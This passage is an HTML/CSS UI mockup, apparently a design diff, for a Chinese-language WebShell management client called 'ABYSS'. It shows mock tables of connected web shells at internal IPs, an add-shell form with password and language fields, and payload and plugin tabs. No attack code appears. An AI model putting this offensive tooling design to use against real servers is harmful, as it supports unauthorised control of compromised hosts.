+  .section-heading { font-size: 15px; font-weight: 700; color: #e2e4ed; letter-spacing: -0.01em; padding-bottom: 10px; border-bottom: 1px solid rgba(255,255,255,0.06); display: flex; align-items: center; gap: 8px; }
+  .section-heading i { color: #4f9cff; flex-shrink: 0; }
+  .settings-card { background: #13141a; border: 1px solid rgba(255,255,255,0.07); border-radius: 8px; padding: 18px 20px; display: flex; flex-direction: column; gap: 14px; }
+  .settings-card-title { font-size: 11px; font-weight: 600; color: #646b85; text-transform: uppercase; letter-spacing: 0.08em; }
+  /* Consistent label-control rows within cards */
+  .s-row { display: flex; align-items: center; justify-content: space-between; gap: 16px; min-height: 32px; }
+  .s-row + .s-row { padding-top: 12px; border-top: 1px solid rgba(255,255,255,0.04); }
+  .s-row-left { display: flex; flex-direction: column; gap: 2px; }
+  .s-row-label { font-size: 13px; color: #e2e4ed; }
+  .s-row-sub { font-size: 11px; color: #646b85; line-height: 1.4; }
+  .s-row-val { font-size: 12px; color: #7a829a; font-family: monospace; }
+  /* Theme picker */
+  .theme-cards { display: grid; grid-template-columns: repeat(3,1fr); gap: 10px; }
+  .theme-card { border: 2px solid rgba(255,255,255,0.08); border-radius: 8px; padding: 10px; cursor: pointer; transition: border-color 120ms; }
+  .theme-card:hover { border-color: rgba(255,255,255,0.16); }
+  .theme-card.active { border-color: #4f9cff; }
+  .theme-preview { height: 38px; border-radius: 5px; margin-bottom: 8px; }
+  .theme-preview.dark  { background: linear-gradient(160deg, #09090c 50%, #131520 50%); }
+  .theme-preview.light { background: linear-gradient(160deg, #eef0f6 50%, #f6f7fb 50%); }
+  .theme-preview.sys   { background: linear-gradient(90deg, #09090c 50%, #f6f7fb 50%); }
+  .theme-label { font-size: 11px; color: #7a829a; text-align: center; }
+  .theme-card.active .theme-label { color: #4f9cff; font-weight: 600; }
+  /* Accent color dots */
+  .accent-row { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
+  .accent-dot { width: 30px; height: 30px; border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; flex-shrink: 0; transition: transform 80ms; }
+  .accent-dot:hover { transform: scale(1.1); }
+  .accent-dot.selected { box-shadow: 0 0 0 2px #13141a, 0 0 0 4px currentColor; }
+  .accent-custom { background: #1f2130; border: 1.5px dashed #3a3f52; }
+  .accent-custom:hover { border-color: #7a829a; }
+
+  /* ===== ACCENT SWATCH REDESIGN ===== */
+  .accent-swatches { display: flex; gap: 8px; flex-wrap: wrap; }
+  .accent-swatch {
+    width: 34px; height: 34px; border-radius: 8px; cursor: pointer;
+    display: flex; align-items: center; justify-content: center;
+    position: relative; transition: transform 80ms;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.35);
+    flex-shrink: 0;
+  }
+  .accent-swatch:hover { transform: scale(1.10); }
+  .accent-swatch.selected::after {
+    content: ''; position: absolute; inset: -3px;
+    border-radius: 11px; border: 2px solid currentColor;
+  }
+  .accent-swatch-custom {
+    background: #1a1c26 !important; border: 1.5px dashed rgba(255,255,255,0.18);
+    box-shadow: none; color: #7a829a !important;
+  }
+  .accent-swatch-custom:hover { border-color: rgba(255,255,255,0.35) !important; }
+  .accent-swatch-custom.selected::after { border-color: var(--accent); }
+  .accent-preview-row {
+    display: flex; align-items: center; justify-content: space-between;
+    padding-top: 12px; margin-top: 4px; border-top: 1px solid rgba(255,255,255,0.05);
+    gap: 10px;
+  }
+  .accent-preview-btn {
+    height: 28px; padding: 0 14px; border-radius: 6px; border: none;
+    background: var(--accent); color: #fff; font-size: 12px; cursor: default;
+    font-weight: 500; flex-shrink: 0;
+  }
+  .accent-hex-display {
+    display: flex; align-items: center; gap: 6px;
+  }
+  .accent-hex-swatch { width: 16px; height: 16px; border-radius: 4px; background: var(--accent); flex-shrink: 0; }
+  /* Light theme accent swatches */
+  .app-frame.theme-light .accent-swatch-custom { background: #e8eaf0 !important; border-color: rgba(0,0,0,0.18) !important; color: #3f4e6e !important; }
+  .app-frame.theme-light .accent-swatch-custom:hover { border-color: rgba(0,0,0,0.35) !important; }
+  .app-frame.theme-light .accent-preview-row { border-color: rgba(0,0,0,0.06); }
+
+  /* ===== ACCENT CSS VARIABLE OVERRIDES ===== */
+  :root { --accent: #4f9cff; --accent-rgb: 79, 156, 255; }
+  .tab-btn.active { color: var(--accent); border-bottom-color: var(--accent); }
+  .btn-primary { background: var(--accent); }
+  .m-nav-item.active { background: rgba(var(--accent-rgb), 0.12); color: var(--accent); }
+  .m-nav-item.active::before { background: var(--accent); }
+  .m-nav-item.active .m-nav-label, .m-nav-item.active .m-nav-icon { color: var(--accent); }
+  .stat-card { border-left-color: var(--accent); }
+  .stat-icon { color: var(--accent); }
+  .tree-item.active { background: rgba(var(--accent-rgb), 0.12); color: var(--accent); }
+  .tree-item.active .tree-count { background: rgba(var(--accent-rgb), 0.15); color: var(--accent); }
+  .s-btn-primary { background: var(--accent); }
+  .radio-btn.active { background: var(--accent); border-color: var(--accent); }
+  .radio-item.active .radio-circle { border-color: var(--accent); background: radial-gradient(circle, var(--accent) 3px, transparent 3px); }
+  .m-slider-fill, .m-slider-dot { background: var(--accent); }
+  .level-badge { background: rgba(var(--accent-rgb), 0.12); color: var(--accent); }
+  .check-item.checked .check-box { background: var(--accent); border-color: var(--accent); }
+  .gen-btn { background: var(--accent); }
+  .filter-tab.active { background: rgba(var(--accent-rgb), 0.12); color: var(--accent); border-color: rgba(var(--accent-rgb), 0.2); }
+  .builtin-badge { background: rgba(var(--accent-rgb), 0.12); color: var(--accent); }
+  .settings-item.active { border-left-color: var(--accent); background: rgba(var(--accent-rgb), 0.10); color: var(--accent); }
+  .theme-card.active { border-color: var(--accent); }
+  .theme-card.active .theme-label { color: var(--accent); }
+  .m-switch.on { background: var(--accent); }
+  .page-btn.active { background: rgba(var(--accent-rgb), 0.12); border-color: rgba(var(--accent-rgb), 0.25); color: var(--accent); }
+  .restore-btn { border-color: rgba(var(--accent-rgb), 0.25); color: var(--accent); }
+  .restore-btn:hover { background: rgba(var(--accent-rgb), 0.10); }
+  .batch-count { color: var(--accent); }
+  .batch-toggle-btn.active { background: rgba(var(--accent-rgb), 0.12) !important; color: var(--accent) !important; border-color: rgba(var(--accent-rgb), 0.3) !important; }
+
+  /* ===== MODAL ===== */
+  .modal-overlay { position: absolute; inset: 0; z-index: 200; background: rgba(0,0,0,0.58); backdrop-filter: blur(3px); display: flex; align-items: center; justify-content: center; }
+  .modal-box { background: #13141a; border: 1px solid rgba(255,255,255,0.10); border-radius: 10px; width: 440px; box-shadow: 0 32px 64px rgba(0,0,0,0.55); display: flex; flex-direction: column; overflow: hidden; }
+  .modal-header { display: flex; align-items: center; justify-content: space-between; padding: 14px 18px; border-bottom: 1px solid rgba(255,255,255,0.07); flex-shrink: 0; }
+  .modal-title { font-size: 14px; font-weight: 600; color: #e2e4ed; }
+  .modal-body { padding: 18px; display: flex; flex-direction: column; gap: 14px; overflow-y: auto; max-height: 370px; }
+  .modal-footer { display: flex; justify-content: flex-end; gap: 8px; padding: 12px 18px; border-top: 1px solid rgba(255,255,255,0.07); flex-shrink: 0; }
+  .form-row { display: flex; flex-direction: column; gap: 5px; }
+  .form-row .s-input { height: 34px; width: 100%; }
+  .form-2col { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+  .s-textarea { background: #13141a; border: 1px solid #1f2130; border-radius: 6px; color: #e2e4ed; padding: 8px 10px; font-size: 12px; font-family: inherit; resize: none; width: 100%; }
+  .conn-test-row { display: flex; align-items: center; gap: 10px; }
+  .conn-result { font-size: 12px; font-family: monospace; }
+  .conn-result.ok { color: #4ade80; }
+  .conn-result.err { color: #f87171; }
+  .conn-result.pending { color: #7a829a; }
+  /* ===== TRASH VIEW ===== */
+  .trash-view { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
+  .trash-header { display: flex; align-items: center; gap: 8px; padding: 10px 14px; border-bottom: 1px solid #1f2130; flex-shrink: 0; }
+  .trash-back-btn { background: transparent; border: none; color: #646b85; cursor: pointer; display: flex; align-items: center; gap: 4px; font-size: 12px; padding: 0 8px; border-radius: 4px; height: 28px; flex-shrink: 0; }
+  .trash-back-btn:hover { color: #e2e4ed; background: #191b23; }
+  .danger-btn { background: rgba(248,113,113,0.10); border: 1px solid rgba(248,113,113,0.25); color: #f87171; font-size: 12px; padding: 0 10px; height: 28px; border-radius: 4px; cursor: pointer; flex-shrink: 0; }
+  .danger-btn:hover { background: rgba(248,113,113,0.20); }
+  .restore-btn { background: transparent; border: 1px solid rgba(79,156,255,0.25); color: #4f9cff; cursor: pointer; padding: 0 8px; border-radius: 4px; font-size: 11px; display: inline-flex; align-items: center; gap: 3px; height: 24px; }
+  .restore-btn:hover { background: rgba(79,156,255,0.10); }
+  /* Light overrides for modal + trash */
+  .app-frame.theme-light .modal-overlay { background: rgba(0,0,0,0.35); }
+  .app-frame.theme-light .modal-box { background: #ffffff; border-color: rgba(0,0,0,0.10); }
+  .app-frame.theme-light .modal-header { border-color: rgba(0,0,0,0.07); }
+  .app-frame.theme-light .modal-title { color: #1e2030; }
+  .app-frame.theme-light .modal-footer { border-color: rgba(0,0,0,0.07); }
+  .app-frame.theme-light .s-textarea { background: #f5f6fc; border-color: rgba(0,0,0,0.10); color: #1e2030; }
+  .app-frame.theme-light .trash-header { border-color: rgba(0,0,0,0.09); }
+  .app-frame.theme-light .trash-back-btn { color: #5e6c90; }
+  .app-frame.theme-light .trash-back-btn:hover { background: rgba(0,0,0,0.05); color: #1e2030; }
+</style>
+</head>
+<body>
+<h2>Section 3：各视图 UI 效果设计 v2</h2>
+<p class="subtitle">✦ 侧边栏已改为正方形导航项（图标上 + 文字下，居中对齐）</p>
+
+<div class="tabs">
+  <button class="tab-btn active" onclick="switchTab('home', this)">首页</button>
+  <button class="tab-btn" onclick="switchTab('project', this)">项目</button>
+  <button class="tab-btn" onclick="switchTab('payload', this)">载荷</button>
+  <button class="tab-btn" onclick="switchTab('plugin', this)">插件 ✦新增</button>
+  <button class="tab-btn" onclick="switchTab('settings', this)">设置</button>
+</div>
+
+<!-- HOME -->
+<div id="tab-home" class="tab-panel active">
+  <div class="app-frame">
+    <div class="m-titlebar">
+      <div class="m-tb-left"><div class="m-logo">◈</div><span class="m-appname">渊渟</span><span class="m-appsub">ABYSS</span></div>
+      <div class="m-tb-right"><button class="m-tb-btn theme-toggle-btn" onclick="toggleTheme()" title="切换主题"><i data-lucide="moon" style="width:14px;height:14px;stroke-width:1.5"></i></button><button class="m-tb-btn" style="font-size:11px">ZH</button><div class="m-wc"><button class="m-wc-btn">−</button><button class="m-wc-btn">□</button><button class="m-wc-close m-wc-btn">✕</button></div></div>
+    </div>
+    <div class="m-body">
+      <div class="m-sidebar">
+        <div class="m-nav">
+          <a class="m-nav-item active"><div class="m-nav-icon"><i data-lucide="house" style="width:20px;height:20px;stroke-width:1.5"></i></div><div class="m-nav-label">首页</div></a>
+          <a class="m-nav-item"><div class="m-nav-icon"><i data-lucide="folder" style="width:20px;height:20px;stroke-width:1.5"></i></div><div class="m-nav-label">项目</div></a>
+          <a class="m-nav-item"><div class="m-nav-icon"><i data-lucide="package" style="width:20px;height:20px;stroke-width:1.5"></i></div><div class="m-nav-label">载荷</div></a>
+          <a class="m-nav-item"><div class="m-nav-icon"><i data-lucide="puzzle" style="width:20px;height:20px;stroke-width:1.5"></i></div><div class="m-nav-label">插件</div></a>
+          <a class="m-nav-item"><div class="m-nav-icon"><i data-lucide="settings" style="width:20px;height:20px;stroke-width:1.5"></i></div><div class="m-nav-label">设置</div></a>
+        </div>
+      </div>
+      <div class="m-content">
+        <div class="home-view">
+          <div class="home-header"><span class="home-title">欢迎回来</span><span class="home-date">2026/04/19</span></div>
+          <div class="stat-cards">
+            <div class="stat-card"><span class="stat-icon"><i data-lucide="terminal" style="width:20px;height:20px;stroke-width:1.5"></i></span><div><div class="stat-num">3</div><div class="stat-label">活跃 Shell</div></div></div>
+            <div class="stat-card"><span class="stat-icon"><i data-lucide="folder" style="width:20px;height:20px;stroke-width:1.5"></i></span><div><div class="stat-num">5</div><div class="stat-label">项目</div></div></div>
+            <div class="stat-card"><span class="stat-icon"><i data-lucide="package" style="width:20px;height:20px;stroke-width:1.5"></i></span><div><div class="stat-num">12</div><div class="stat-label">载荷</div></div></div>
+            <div class="stat-card"><span class="stat-icon"><i data-lucide="activity" style="width:20px;height:20px;stroke-width:1.5"></i></span><div><div class="stat-num">142</div><div class="stat-label">今日请求</div></div></div>
+          </div>
+          <div>
+            <div class="section-title">最近连接</div>
+            <div class="empty-state">
+              <div class="empty-icon"><i data-lucide="globe" style="width:48px;height:48px;stroke-width:1;color:#1f2130"></i></div>
+              <div style="font-size:14px;color:#e2e4ed">还没有 WebShell</div>
+              <div style="font-size:13px;color:#7a829a">前往「项目」页面添加第一个 WebShell</div>
+              <button class="btn-primary">前往项目</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="m-statusbar"><div class="m-status-dot active"></div><span>已连接</span><div class="m-divider"></div><span>项目 <span class="m-stat-num">5</span></span><div class="m-divider"></div><span>Shell <span class="m-stat-num">3</span></span><div class="m-divider"></div><span>载荷 <span class="m-stat-num">12</span></span></div>
+  </div>
+  <p style="color:#646b85;font-size:12px;margin-top:10px">✦ 侧边栏：80px宽，64×64px 正方形项，图标20px居上，标签11px居下，激活时左侧3px竖条指示</p>
+</div>
+
+<!-- PROJECT -->
+<div id="tab-project" class="tab-panel">
+  <div class="app-frame">
+    <div class="m-titlebar">
+      <div class="m-tb-left"><div class="m-logo">◈</div><span class="m-appname">渊渟</span><span class="m-appsub">ABYSS</span></div>
+      <div class="m-tb-right"><button class="m-tb-btn theme-toggle-btn" onclick="toggleTheme()" title="切换主题"><i data-lucide="moon" style="width:14px;height:14px;stroke-width:1.5"></i></button><button class="m-tb-btn" style="font-size:11px">ZH</button><div class="m-wc"><button class="m-wc-btn">−</button><button class="m-wc-btn">□</button><button class="m-wc-close m-wc-btn">✕</button></div></div>
+    </div>
+    <div class="m-body">
+      <div class="m-sidebar">
+        <div class="m-nav">
+          <a class="m-nav-item"><div class="m-nav-icon"><i data-lucide="house" style="width:20px;height:20px;stroke-width:1.5"></i></div><div class="m-nav-label">首页</div></a>
+          <a class="m-nav-item active"><div class="m-nav-icon"><i data-lucide="folder" style="width:20px;height:20px;stroke-width:1.5"></i></div><div class="m-nav-label">项目</div></a>
+          <a class="m-nav-item"><div class="m-nav-icon"><i data-lucide="package" style="width:20px;height:20px;stroke-width:1.5"></i></div><div class="m-nav-label">载荷</div></a>
+          <a class="m-nav-item"><div class="m-nav-icon"><i data-lucide="puzzle" style="width:20px;height:20px;stroke-width:1.5"></i></div><div class="m-nav-label">插件</div></a>
+          <a class="m-nav-item"><div class="m-nav-icon"><i data-lucide="settings" style="width:20px;height:20px;stroke-width:1.5"></i></div><div class="m-nav-label">设置</div></a>
+        </div>
+      </div>
+      <div class="m-content">
+        <div class="project-view">
+          <div class="project-tree">
+            <div class="tree-header"><button class="s-btn s-btn-primary" style="width:100%;font-size:12px" onclick="openModal('proj-modal-new')">+ 新建项目</button></div>
+            <div class="tree-list" style="padding:6px 0">
+              <div class="tree-item tree-group active" onclick="toggleTreeGroup(this)">
+                <i data-lucide="chevron-down" class="tree-chevron" style="width:14px;height:14px;stroke-width:2"></i>
+                <i data-lucide="folder-open" style="width:14px;height:14px;stroke-width:1.5;flex-shrink:0"></i>
+                <span class="tree-name">全部项目</span>
+                <span class="tree-count">8</span>
+              </div>
+              <div class="tree-children">
+                <div class="tree-item tree-child">
+                  <i data-lucide="folder" style="width:13px;height:13px;stroke-width:1.5;flex-shrink:0"></i>
+                  <span class="tree-name">项目 Alpha</span>
+                  <span class="tree-count">5</span>
+                </div>
+                <div class="tree-item tree-child">
+                  <i data-lucide="folder" style="width:13px;height:13px;stroke-width:1.5;flex-shrink:0"></i>
+                  <span class="tree-name">项目 Beta</span>
+                  <span class="tree-count">2</span>
+                </div>
+                <div class="tree-item tree-child">
+                  <i data-lucide="folder" style="width:13px;height:13px;stroke-width:1.5;flex-shrink:0"></i>
+                  <span class="tree-name">项目 Gamma</span>
+                  <span class="tree-count">1</span>
+                </div>
+              </div>
+              <div class="tree-item" style="margin-top:6px;border-top:1px solid #1f2130;border-radius:0;margin-left:0;margin-right:0;padding:0 16px" onclick="showTrash(this)">
+                <i data-lucide="trash-2" style="width:13px;height:13px;stroke-width:1.5;flex-shrink:0"></i>
+                <span class="tree-name">回收站</span>
+                <span class="tree-count">3</span>
+              </div>
+            </div>
+          </div>
+          <div class="shell-area">
+            <div id="shell-main" style="flex:1;display:flex;flex-direction:column;overflow:hidden">
+            <div class="table-toolbar">
+              <input class="s-input" placeholder="搜索..." style="width:160px" />
+              <select class="s-input" style="width:70px"><option>全部</option><option>PHP</option></select>
+              <div class="spacer"></div>
+              <button class="s-btn s-btn-default batch-toggle-btn" onclick="toggleBatch(this)" style="display:flex;align-items:center;gap:5px">
+                <i data-lucide="check-square" style="width:13px;height:13px;stroke-width:1.5"></i> 选择
+              </button>
+              <button class="s-btn s-btn-primary" onclick="openModal('proj-modal-shell')">+ 添加 Shell</button>
+            </div>
+            <div class="shell-table-wrap">
+              <table class="shell-table">
+                <thead><tr>
+                  <th class="batch-col" style="width:32px"><input type="checkbox" id="chk-all" onchange="selectAll(this)"/></th>
+                  <th style="width:80px">状态</th>
+                  <th style="width:110px">名称</th>
+                  <th>URL</th>
+                  <th style="width:52px">类型</th>
+                  <th style="width:88px">加密方式</th>
+                  <th style="width:80px">最近连接</th>
+                  <th style="width:96px">备注</th>
+                  <th style="width:72px">操作</th>
+                </tr></thead>
+                <tbody>
+                  <tr>
+                    <td class="batch-col"><input type="checkbox" class="row-chk"/></td>
+                    <td><div class="status-cell"><span class="s-dot active"></span><span class="status-text active">在线</span></div></td>
+                    <td style="color:#e2e4ed;font-weight:500">shell-prod</td>
+                    <td><span class="s-mono">https://192.168.1.1/shell.php</span></td>
+                    <td><span class="s-badge s-php">PHP</span></td>
+                    <td><span class="enc-badge">AES-256-GCM</span></td>
+                    <td><span class="s-mono">2分钟前</span></td>
+                    <td><span class="note-cell">生产环境主机</span></td>
+                    <td><div class="row-actions"><button class="row-act-btn"><i data-lucide="monitor" style="width:13px;height:13px;stroke-width:1.5"></i></button><button class="row-act-btn"><i data-lucide="pencil" style="width:13px;height:13px;stroke-width:1.5"></i></button><button class="row-act-btn" style="color:#f87171"><i data-lucide="trash-2" style="width:13px;height:13px;stroke-width:1.5"></i></button></div></td>
+                  </tr>
+                  <tr>
+                    <td class="batch-col"><input type="checkbox" class="row-chk"/></td>
+                    <td><div class="status-cell"><span class="s-dot timeout"></span><span class="status-text timeout">超时</span></div></td>
+                    <td style="color:#e2e4ed;font-weight:500">shell-test</td>
+                    <td><span class="s-mono">http://10.0.0.5/cmd.jsp</span></td>
+                    <td><span class="s-badge s-jsp">JSP</span></td>
+                    <td><span class="enc-badge">XOR</span></td>
+                    <td><span class="s-mono">1小时前</span></td>
+                    <td><span class="note-cell" style="color:#4f9cff">—</span></td>
+                    <td><div class="row-actions"><button class="row-act-btn"><i data-lucide="monitor" style="width:13px;height:13px;stroke-width:1.5"></i></button><button class="row-act-btn"><i data-lucide="pencil" style="width:13px;height:13px;stroke-width:1.5"></i></button><button class="row-act-btn" style="color:#f87171"><i data-lucide="trash-2" style="width:13px;height:13px;stroke-width:1.5"></i></button></div></td>
+                  </tr>
+                  <tr>
+                    <td class="batch-col"><input type="checkbox" class="row-chk"/></td>
+                    <td><div class="status-cell"><span class="s-dot offline"></span><span class="status-text offline">离线</span></div></td>
+                    <td style="color:#e2e4ed;font-weight:500">shell-dev</td>
+                    <td><span class="s-mono">http://172.16.0.1/web.aspx</span></td>
+                    <td><span class="s-badge" style="background:rgba(167,139,250,0.15);color:#a78bfa">ASP</span></td>
+                    <td><span class="enc-badge">无加密</span></td>
+                    <td><span class="s-mono">3天前</span></td>
+                    <td><span class="note-cell">内网测试机</span></td>
+                    <td><div class="row-actions"><button class="row-act-btn"><i data-lucide="monitor" style="width:13px;height:13px;stroke-width:1.5"></i></button><button class="row-act-btn"><i data-lucide="pencil" style="width:13px;height:13px;stroke-width:1.5"></i></button><button class="row-act-btn" style="color:#f87171"><i data-lucide="trash-2" style="width:13px;height:13px;stroke-width:1.5"></i></button></div></td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="table-footer">
+              <div style="display:flex;align-items:center;gap:8px">
+                <span style="color:#646b85;font-size:11px;font-family:monospace">共 56 条</span>
+                <select class="page-size-select">
+                  <option>20 条/页</option>
+                  <option>50 条/页</option>
+                  <option>100 条/页</option>
+                </select>
+              </div>
+              <div class="pagination">
+                <button class="page-btn" disabled><i data-lucide="chevron-left" style="width:13px;height:13px;stroke-width:2"></i></button>
+                <button class="page-btn active">1</button>
+                <button class="page-btn">2</button>
+                <button class="page-btn">3</button>
+                <span style="color:#646b85;font-size:12px;padding:0 4px">…</span>
+                <button class="page-btn">6</button>
+                <button class="page-btn"><i data-lucide="chevron-right" style="width:13px;height:13px;stroke-width:2"></i></button>
+              </div>
+            </div>
+            </div><!-- /shell-main -->
+            <!-- Trash View -->
+            <div class="trash-view" id="trash-view" style="display:none">
+              <div class="trash-header">
+                <button class="trash-back-btn" onclick="showAllShells()"><i data-lucide="arrow-left" style="width:13px;height:13px;stroke-width:2"></i> 返回</button>
+                <div style="width:1px;height:14px;background:#1f2130;flex-shrink:0"></div>
+                <i data-lucide="trash-2" style="width:13px;height:13px;stroke-width:1.5;color:#646b85;flex-shrink:0"></i>
+                <span style="font-size:13px;font-weight:600;flex:1">回收站</span>
+                <span style="font-size:11px;font-family:monospace;color:#646b85;flex-shrink:0">共 3 个</span>
+                <button class="danger-btn">清空回收站</button>
+              </div>
+              <div class="shell-table-wrap">
+                <table class="shell-table">
+                  <thead><tr>
+                    <th style="width:120px">名称</th>
+                    <th>URL</th>
+                    <th style="width:52px">类型</th>
+                    <th style="width:88px">加密方式</th>
+                    <th style="width:90px">删除时间</th>
+                    <th style="width:110px">操作</th>
+                  </tr></thead>
+                  <tbody>
+                    <tr>
+                      <td style="color:#e2e4ed;font-weight:500">shell-old</td>
+                      <td><span class="s-mono">https://192.168.2.5/shell.php</span></td>
+                      <td><span class="s-badge s-php">PHP</span></td>
+                      <td><span class="enc-badge">AES-256-GCM</span></td>
+                      <td><span class="s-mono">2天前</span></td>
+                      <td><div style="display:flex;gap:4px;align-items:center">
+                        <button class="restore-btn"><i data-lucide="rotate-ccw" style="width:11px;height:11px;stroke-width:2"></i> 恢复</button>
+                        <button class="row-act-btn" style="color:#f87171"><i data-lucide="trash-2" style="width:13px;height:13px;stroke-width:1.5"></i></button>
+                      </div></td>
+                    </tr>
+                    <tr>
+                      <td style="color:#e2e4ed;font-weight:500">old-test</td>
+                      <td><span class="s-mono">http://10.0.1.2/cmd.jsp</span></td>
+                      <td><span class="s-badge s-jsp">JSP</span></td>
+                      <td><span class="enc-badge">XOR</span></td>
+                      <td><span class="s-mono">5天前</span></td>
+                      <td><div style="display:flex;gap:4px;align-items:center">
+                        <button class="restore-btn"><i data-lucide="rotate-ccw" style="width:11px;height:11px;stroke-width:2"></i> 恢复</button>
+                        <button class="row-act-btn" style="color:#f87171"><i data-lucide="trash-2" style="width:13px;height:13px;stroke-width:1.5"></i></button>
+                      </div></td>
+                    </tr>
+                    <tr>
+                      <td style="color:#e2e4ed;font-weight:500">legacy-asp</td>
+                      <td><span class="s-mono">http://172.16.1.10/old.asp</span></td>
+                      <td><span class="s-badge" style="background:rgba(167,139,250,0.15);color:#a78bfa">ASP</span></td>
+                      <td><span class="enc-badge">无加密</span></td>
+                      <td><span class="s-mono">14天前</span></td>
+                      <td><div style="display:flex;gap:4px;align-items:center">
+                        <button class="restore-btn"><i data-lucide="rotate-ccw" style="width:11px;height:11px;stroke-width:2"></i> 恢复</button>
+                        <button class="row-act-btn" style="color:#f87171"><i data-lucide="trash-2" style="width:13px;height:13px;stroke-width:1.5"></i></button>
+                      </div></td>
+                    </tr>
+                  </tbody>
+                </table>
+              </div>
+            </div>
+            <div class="batch-bar">
+              <span class="batch-count" style="font-size:12px" id="batch-count-label">已选 0 个</span>
+              <div style="width:1px;height:14px;background:#1f2130"></div>
+              <button class="batch-action">批量测试</button>
+              <button class="batch-action">批量导出</button>
+              <div class="spacer"></div>
+              <button class="batch-action batch-del">移入回收站</button>
+              <button class="batch-action" onclick="toggleBatch(document.querySelector('.batch-toggle-btn'))" style="color:#7a829a">取消</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="m-statusbar"><div class="m-status-dot active"></div><span>已连接</span><div class="m-divider"></div><span>Shell <span class="m-stat-num">8</span></span></div>
+    <!-- New Project Modal -->
+    <div id="proj-modal-new" class="modal-overlay" style="display:none" onclick="closeModalByOverlay(event,'proj-modal-new')">
+      <div class="modal-box">
+        <div class="modal-header">
+          <span class="modal-title">新建项目</span>
+          <button class="icon-btn" onclick="closeModal('proj-modal-new')"><i data-lucide="x" style="width:14px;height:14px;stroke-width:2"></i></button>
+        </div>
+        <div class="modal-body">
+          <div class="form-row">
+            <label class="field-label">项目名称 <span style="color:#f87171">*</span></label>
+            <input class="s-input" placeholder="例：渗透测试 2026-Q2"/>
+          </div>
+          <div class="form-row">
+            <label class="field-label">描述（可选）</label>
+            <textarea class="s-textarea" placeholder="项目说明、目标范围等..." rows="3"></textarea>
+          </div>
+        </div>
+        <div class="modal-footer">
+          <button class="s-btn s-btn-default" onclick="closeModal('proj-modal-new')">取消</button>
+          <button class="s-btn s-btn-primary">创建项目</button>
+        </div>
+      </div>
+    </div>
+    <!-- Add Shell Modal -->
+    <div id="proj-modal-shell" class="modal-overlay" style="display:none" onclick="closeModalByOverlay(event,'proj-modal-shell')">
+      <div class="modal-box" style="width:480px">
+        <div class="modal-header">
+          <span class="modal-title">添加 WebShell</span>
+          <button class="icon-btn" onclick="closeModal('proj-modal-shell')"><i data-lucide="x" style="width:14px;height:14px;stroke-width:2"></i></button>
+        </div>
+        <div class="modal-body">
+          <div class="form-row">
+            <label class="field-label">名称 <span style="color:#f87171">*</span></label>
+            <input class="s-input" placeholder="例：shell-prod"/>
+          </div>
+          <div class="form-row">
+            <label class="field-label">URL <span style="color:#f87171">*</span></label>
+            <input class="s-input" placeholder="https://example.com/shell.php" style="font-family:monospace"/>
+          </div>
+          <div class="form-2col">
+            <div class="form-row">
+              <label class="field-label">密码 <span style="color:#f87171">*</span></label>
+              <input class="s-input" type="password" placeholder="WebShell 密码" style="font-family:monospace"/>
+            </div>
+            <div class="form-row">
+              <label class="field-label">HTTP 方法</label>
+              <div class="radio-group" style="gap:4px">
+                <button class="radio-btn active" style="height:34px;flex:1">POST</button>
+                <button class="radio-btn" style="height:34px;flex:1">GET</button>
+              </div>
+            </div>
+          </div>
+          <div class="form-row">
+            <label class="field-label">语言 <span style="color:#f87171">*</span></label>
+            <div class="radio-group" style="gap:4px">
+              <button class="radio-btn active" style="height:30px;flex:1">PHP</button>
+              <button class="radio-btn" style="height:30px;flex:1">JSP</button>
+              <button class="radio-btn" style="height:30px;flex:1">ASP</button>
+              <button class="radio-btn" style="height:30px;flex:1">ASPX</button>
+            </div>
+          </div>
+          <div class="form-row">
+            <label class="field-label">所属项目</label>
+            <select class="s-input" style="height:34px">
+              <option>全部项目（未分类）</option>
+              <option>项目 Alpha</option>
+              <option>项目 Beta</option>
+              <option>项目 Gamma</option>
+            </select>
+          </div>
+          <div class="form-row">
+            <label class="field-label">备注（可选）</label>
+            <textarea class="s-textarea" placeholder="Shell 说明..." rows="2"></textarea>
+          </div>
+          <div class="conn-test-row">
+            <button class="s-btn s-btn-default" style="height:30px;font-size:12px;display:flex;align-items:center;gap:5px" onclick="testConn()">
+              <i data-lucide="zap" style="width:12px;height:12px;stroke-width:1.5"></i> 测试连接
+            </button>
+            <span class="conn-result" id="conn-result"></span>
+          </div>
+        </div>
+        <div class="modal-footer">
+          <button class="s-btn s-btn-default" onclick="closeModal('proj-modal-shell')">取消</button>
+          <button class="s-btn s-btn-primary">添加</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- PAYLOAD -->
+<div id="tab-payload" class="tab-panel">
+  <div class="app-frame">
+    <div class="m-titlebar">
+      <div class="m-tb-left"><div class="m-logo">◈</div><span class="m-appname">渊渟</span><span class="m-appsub">ABYSS</span></div>
+      <div class="m-tb-right"><button class="m-tb-btn theme-toggle-btn" onclick="toggleTheme()" title="切换主题"><i data-lucide="moon" style="width:14px;height:14px;stroke-width:1.5"></i></button><button class="m-tb-btn" style="font-size:11px">ZH</button><div class="m-wc"><button class="m-wc-btn">−</button><button class="m-wc-btn">□</button><button class="m-wc-close m-wc-btn">✕</button></div></div>
+    </div>
+    <div class="m-body">
+      <div class="m-sidebar">
+        <div class="m-nav">
+          <a class="m-nav-item"><div class="m-nav-icon"><i data-lucide="house" style="width:20px;height:20px;stroke-width:1.5"></i></div><div class="m-nav-label">首页</div></a>
+          <a class="m-nav-item"><div class="m-nav-icon"><i data-lucide="folder" style="width:20px;height:20px;stroke-width:1.5"></i></div><div class="m-nav-label">项目</div></a>
+          <a class="m-nav-item active"><div class="m-nav-icon"><i data-lucide="package" style="width:20px;height:20px;stroke-width:1.5"></i></div><div class="m-nav-label">载荷</div></a>
+          <a class="m-nav-item"><div class="m-nav-icon"><i data-lucide="puzzle" style="width:20px;height:20px;stroke-width:1.5"></i></div><div class="m-nav-label">插件</div></a>
+          <a class="m-nav-item"><div class="m-nav-icon"><i data-lucide="settings" style="width:20px;height:20px;stroke-width:1.5"></i></div><div class="m-nav-label">设置</div></a>
+        </div>
+      </div>
+      <div class="m-content">
+        <div class="payload-view">
+
